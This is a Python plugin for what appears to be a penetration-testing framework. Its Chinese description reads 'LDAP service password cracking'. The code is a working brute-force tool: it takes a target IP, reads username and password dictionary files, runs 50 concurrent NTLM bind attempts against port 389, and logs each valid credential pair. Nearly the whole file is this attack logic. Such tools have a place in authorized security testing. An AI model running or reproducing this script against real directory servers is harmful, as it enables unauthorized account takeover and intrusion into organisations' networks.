# -*-* coding:UTF-8
import os
from ldap3 import Server, Connection, ALL


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ldap服务口令破解",
        "datetime": "2022-01-02"
    }

    @cli.options('ip', desc="设置输入目标", default='{self.target.value}')
    @cli.options('port', desc="设置目标端口", type=int, default=389)
    @cli.options('method', desc="口令爆破模式 1:单点模式 2:交叉模式", type=int, default=2)
    @cli.options('username', desc="用户名称或字典文件", default=os.path.join('data', 'ldap_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'ldap_password.dict'))
    @cli.options('timeout', desc="连接超时时间", type=int, default=5)
    @cli.options('workers', desc="协程并发数量", type=int, default=50)
    def ip(self, ip, port, method, username, password, timeout, workers) -> dict:
        with self.async_pool(max_workers=workers) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.custom_task, ip, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def custom_task(self, ip, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        server = Server(
            host=ip,
            port=port,
            use_ssl=False,
            connect_timeout=timeout,
            get_info='ALL'
        )
        conn = Connection(
            server,
            user=username,
            password=password,
            check_names=True,
            lazy=False,
            auto_bind=True,
            receive_timeout=timeout,
            authentication="NTLM"
        )
        conn.unbind()
        server.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': port,
            'server': 'ldap',
            'username': username,
            'password': password
        }
